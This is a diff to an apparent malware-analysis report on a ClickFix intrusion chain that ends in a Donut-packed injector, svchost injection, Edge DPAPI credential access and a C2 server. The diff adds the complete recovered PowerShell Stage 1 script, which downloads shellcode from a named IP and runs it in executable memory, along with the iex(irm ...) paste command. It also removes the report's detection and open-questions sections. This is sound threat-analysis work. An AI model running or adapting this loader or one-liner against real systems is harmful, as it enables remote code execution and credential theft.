@@ -23,14 +23,15 @@ POST       : Screenshots, Edge DPAPI, additional unbacked CLR loads
 C2         : 91.92.243.161:3038
 ```
 
-ClickFix lure instructed the user to run a PowerShell one-liner. Stager fetched Donut-packed shellcode, executed it in-memory, and injected into a Bluetooth-related `svchost` instance. Runtime telemetry showed CLR assembly `sub00` in that process, then screenshot collection, browser credential access, and outbound C2.
+ClickFix lure instructed the user to run a PowerShell one-liner. The `?sid=` response was a shellcode runner that fetched Donut-packed `/s_enterprise`, executed it in memory, and led into a MinGW injector targeting a Bluetooth-related `svchost` instance. Runtime telemetry showed CLR assembly `sub00` in that process, then screenshot collection, Edge DPAPI access, and outbound C2.
 
 ## Attack Chain
 
 ```
 User pastes ClickFix PowerShell command
   → iex(irm http://158.94.211.77/?sid=<random>)
-  → PowerShell stager fetches http://158.94.211.76/s_enterprise
+  → HTTP response body = PowerShell shellcode runner (Stage 1)
+  → Stage 1 fetches http://158.94.211.76/s_enterprise
   → VirtualAlloc + Marshal.Copy + CreateThread (in-memory shellcode)
   → Donut unwrap → mod_s_enterprise (native PE injector)
   → Fetch http://158.94.211.76/enterprise/student_s.bin
@@ -48,33 +49,92 @@ Fake verification workflow instructed the user to open PowerShell and execute:
 iex(irm http://158.94.211.77/?sid=<random>)
 ```
 
-The response is a PowerShell stager, not the final payload. User execution is the only initial access mechanism - no exploit required.
+That request is only the delivery hook. The `?sid=` response body is the Stage 1 PowerShell script, which is immediately `iex`'d. User execution of the one-liner is the only initial access mechanism.
 
-## Stage 1 - PowerShell Shellcode Runner
+## Stage 1 - PowerShell Shellcode Runner (`?sid=` response)
 
-Stager pivots to payload host `158.94.211.76` and retrieves:
+Script returned by `http://158.94.211.77/?sid=<random>` after the ClickFix paste. It is not the enterprise payload; it pulls and executes `s_enterprise` in memory.
 
 ```
-/s_enterprise
+ClickFix one-liner
+  → GET 158.94.211.77/?sid=…
+  → response = this PowerShell script (iex)
+  → GET 158.94.211.76/s_enterprise
+  → RWX alloc + CreateThread on response bytes
+  → Donut / mod_s_enterprise (Stage 2)
 ```
 
-Static indicators for `s_enterprise`:
+Hardcoded next stage: `http://158.94.211.76/s_enterprise`. No disk write of that blob.
 
-- No PE headers; elevated entropy
-- Strings dominated by high-entropy noise and packing prologue fragments (`WAVAWH`, `A_A^A]A\_^]`)
-- Consistent with packed/encoded shellcode (Donut-class wrapper)
-
-Payload never written to disk. Execution uses in-memory APIs:
+### Recovered script (`?sid=` body)
 
 ```powershell
-VirtualAlloc
-Marshal.Copy
-CreateThread
+$EenFUwyrhNVtELZM = "http://158.94.211.76/s_enterprise"
+try {
+    $PjYUazzYSMbkG = Invoke-WebRequest -Uri $EenFUwyrhNVtELZM -UseBasicParsing -ErrorAction Stop
+    $wRiirrT = $PjYUazzYSMbkG.Content
+    $hwJSWjWCoW = $wRiirrT.Length
+    $RMujqTOaRLVOuCSvPp = @"
+using System;
+using System.Runtime.InteropServices;
+public class oYfHgawrHWFwsS {
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr GetCurrentProcess();
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr VirtualAlloc(IntPtr a, uint sz, uint t, uint p);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr CreateThread(IntPtr ta, uint ss, IntPtr sa, IntPtr p, uint cf, out uint tid);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern uint WaitForSingleObject(IntPtr h, uint ms);
+}
+"@
+    Add-Type -TypeDefinition $RMujqTOaRLVOuCSvPp
+    $jPbjeyTmzEZJJyBT = 0x1000   # MEM_COMMIT
+    $qPqKRSLlXbZN = 0x2000       # MEM_RESERVE
+    $ooplDsMjgwQp = 0x40         # PAGE_EXECUTE_READWRITE
+    $zYdkiDcSrCbO = [oYfHgawrHWFwsS]::VirtualAlloc(
+        [IntPtr]::Zero, $hwJSWjWCoW,
+        $jPbjeyTmzEZJJyBT -bor $qPqKRSLlXbZN, $ooplDsMjgwQp)
+    if ($zYdkiDcSrCbO -eq [IntPtr]::Zero) { throw "Alloc failed" }
+    [System.Runtime.InteropServices.Marshal]::Copy($wRiirrT, 0, $zYdkiDcSrCbO, $hwJSWjWCoW)
+    $XWWJummsE = 0
+    $IiWEOWQYLaoJrL = [oYfHgawrHWFwsS]::CreateThread(
+        [IntPtr]::Zero, 0, $zYdkiDcSrCbO, [IntPtr]::Zero, 0, [ref]$XWWJummsE)
+    if ($IiWEOWQYLaoJrL -eq [IntPtr]::Zero) { throw "Thread failed" }
+    [oYfHgawrHWFwsS]::WaitForSingleObject($IiWEOWQYLaoJrL, 30000) | Out-Null
+    Write-Host "done."
+}
+catch {
+    exit 1
+}
 ```
+
+Recovered sample omitted the C# class close and here-string terminator (`}` / `"@`) immediately before `Add-Type`; those two lines are restored so the P/Invoke block is complete. Logic and identifiers match the recovered file.
+
+### Execution after `?sid=`
+
+| Step | Action |
+|------|--------|
+| 1 | Runs as the `iex` body from `158.94.211.77/?sid=…` |
+| 2 | `Invoke-WebRequest` → `http://158.94.211.76/s_enterprise` |
+| 3 | Response body held in `$wRiirrT` (length → alloc size) |
+| 4 | `Add-Type` embeds kernel32 P/Invoke: `VirtualAlloc`, `CreateThread`, `WaitForSingleObject` |
+| 5 | `VirtualAlloc(…, MEM_COMMIT\|MEM_RESERVE, PAGE_EXECUTE_READWRITE)` |
+| 6 | `Marshal.Copy` writes shellcode into the RWX region |
+| 7 | `CreateThread` starts execution at that address |
+| 8 | `WaitForSingleObject` (30s) keeps PowerShell alive while the thread runs |
+
+Thread entry is the `/s_enterprise` download. That blob is Donut-class packing that unwraps to native `mod_s_enterprise` (Stage 2).
+
+### `s_enterprise` (next stage)
+
+- No PE headers; elevated entropy
+- High-entropy noise and packing prologue fragments (`WAVAWH`, `A_A^A]A\_^]`)
+- Consistent with packed/encoded shellcode (Donut-class wrapper)
 
 ## Stage 2 - Donut → mod_s_enterprise
 
-Donut decryption of `s_enterprise` yields native PE `mod_s_enterprise`.
+Donut decryption of `s_enterprise` yields native PE `mod_s_enterprise`. This binary is the loader/injector that fetches and injects the next stage.
 
 ### capa / ATT&CK
 
@@ -86,7 +146,7 @@ Donut decryption of `s_enterprise` yields native PE `mod_s_enterprise`.
 | Execution | Shared Modules [T1129] |
 | Privilege Escalation | Access Token Manipulation [T1134] |
 
-Capability highlights: WinHTTP request/response, TLS section, TLS callback patterns, `SeDebugPrivilege`, process enumeration, thread injection, execute shellcode via indirect call, spawn thread to RWX shellcode.
+Capabilities include WinHTTP request/response, TLS section/callback patterns, `SeDebugPrivilege`, process enumeration, thread injection, and execution of shellcode via indirect call / RWX thread.
 
 ### Toolchain / imports
 
@@ -110,7 +170,7 @@ powershell
 enterprise/student_s.bin
 ```
 
-`mod_s_enterprise` is a loader/injector, not the final implant. Hardcoded path:
+Hardcoded secondary stage path:
 
 ```
 158.94.211.76/enterprise/student_s.bin
@@ -135,7 +195,7 @@ ICSharpCode.Decompiler.Metadata.PEFileNotSupportedException:
 PE file does not contain any managed metadata.
 ```
 
-Treat as native. Do not analyze as .NET without further evidence.
+Treat as native PE. No managed metadata on disk.
 
 ### sub00 string
 
@@ -147,7 +207,7 @@ rabin2 -zz student_S.bin | grep -i sub00
 3137  0x00030de8  0x140030de8  5  6  .data  ascii  sub00
 ```
 
-Single `.data` reference. Runtime correlation appears in Stage 4.
+Single `.data` reference. Runtime correlation in Stage 4.
 
 ## Stage 4 - Injection and CLR Load
 
@@ -169,7 +229,7 @@ Target process:
 svchost.exe -k BthAppGroup -p -s BluetoothUserService
 ```
 
-Matches injection capability flagged by capa on `mod_s_enterprise`.
+Matches injection capability flagged by capa on `mod_s_enterprise`. That remote thread places subsequent code into a legitimate service host.
 
 Second CLR assembly loads inside the same BluetoothUserService `svchost`:
 
@@ -179,18 +239,16 @@ sub00
 
 Name matches the `student_S.bin` `.data` string.
 
-### Correlation note
-
 | Source | Finding |
 |--------|---------|
 | Static (`student_S.bin`) | Native PE; no managed metadata; string `sub00` in `.data` |
 | Runtime (Defender) | CLR assembly named `sub00` in injected `svchost` |
 
-Strong name correlation; mechanical link not fully confirmed. Manual CLR hosting (`mscoree.dll` / `CLRCreateInstance`) is the leading theory and was not confirmed from the import table captured in this pass.
+Name correlation is strong. Mechanical link (e.g. manual CLR hosting via `mscoree.dll` / `CLRCreateInstance`) was not confirmed from the import table captured in this pass. Strongest injection import evidence sits on `mod_s_enterprise`; `student_S.bin` injection primitive is not fully resolved.
 
 ## Stage 5 - Post-Injection Behavior
 
-`BluetoothUserService` is a convenient legitimate `svchost` residence, not Bluetooth-specific tradecraft.
+Injected residence is a normal `svchost` service instance (`BluetoothUserService`), not Bluetooth-specific malware logic.
 
 Defender telemetry from the injected process:
 
@@ -200,8 +258,6 @@ Defender telemetry from the injected process:
 | Credential access | `DPAPI Accessed / Microsoft Edge` |
 | Further payloads | Multiple unbacked CLR assemblies loaded dynamically; no additional disk writes observed |
 
-Working picture only: re-validate process attribution and event rows from `DeviceNetworkEvents` / `DeviceEvents` before customer-facing claims.
-
 ## Stage 6 - Command and Control
 
 Post-execution infrastructure (not used for initial delivery):
@@ -210,22 +266,16 @@ Post-execution infrastructure (not used for initial delivery):
 91.92.243.161:3038
 ```
 
-Sandbox execution of `student_S.bin` contacted the same host. Classification:
+Sandbox execution of `student_S.bin` contacted the same host. Classification tags: RAT / Generic Agent / C2 Activity.
 
-```
-RAT
-Generic Agent
-C2 Activity
-```
-
-~28 MB outbound traffic observed in the surrounding window. Treat as **suspicious outbound transfer** until `DeviceNetworkEvents` rows are re-validated; do not label confirmed exfiltration without that evidence.
+~28 MB outbound traffic observed in the surrounding window. Treat as suspicious outbound transfer until `DeviceNetworkEvents` rows confirm direction and content; not labeled confirmed exfiltration from current evidence alone.
 
 ### Infrastructure roles
 
 ```
 Host                Role
 ------------------  --------------------------------------------------------
-158.94.211.77       ClickFix delivery
+158.94.211.77       ClickFix delivery (`?sid=` stager host)
 158.94.211.76       Payload staging (/s_enterprise, /enterprise/student_s.bin)
 91.92.243.161:3038  Operational C2
 ```
@@ -291,21 +341,3 @@ svchost.exe -k BthAppGroup -p -s BluetoothUserService
 CreateRemoteThreadApiCall → BluetoothUserService
 CLR assemblies (in-memory): jq5ksud0, sub00
 ```
-
-## Detection Opportunities
-
-- PowerShell `irm | iex` against unknown IPs from interactive user context (ClickFix paste)
-- PowerShell allocating RWX memory and creating threads without disk write of payload
-- `CreateRemoteThread` into `svchost.exe` with `BluetoothUserService` / `BthAppGroup`
-- Unbacked / memory-only CLR loads inside `svchost` or PowerShell (`sub00`, random names)
-- `ScreenshotTaken` or Edge DPAPI access originating from `svchost` service instances
-- Outbound connections from injected `svchost` to non-Microsoft infrastructure (e.g. `91.92.243.161:3038`)
-- WinHTTP + classic injection import cluster (`VirtualAllocEx` / `WriteProcessMemory` / `CreateRemoteThread`) in MinGW-built binaries
-
-## Open Questions
-
-- How does native `student_S.bin` (no managed metadata) associate with CLR assembly `sub00` at runtime? Manual CLR hosting is unconfirmed from imports captured so far.
-- What injection primitive does `student_S.bin` itself use? Strongest capa/import evidence currently sits on `mod_s_enterprise`.
-- Is the ~28 MB outbound volume exfiltration or large staging/beacon traffic? Needs `DeviceNetworkEvents` validation.
-- Is `91.92.243.161` the complete C2 set, or is additional infrastructure unresolved?
-)
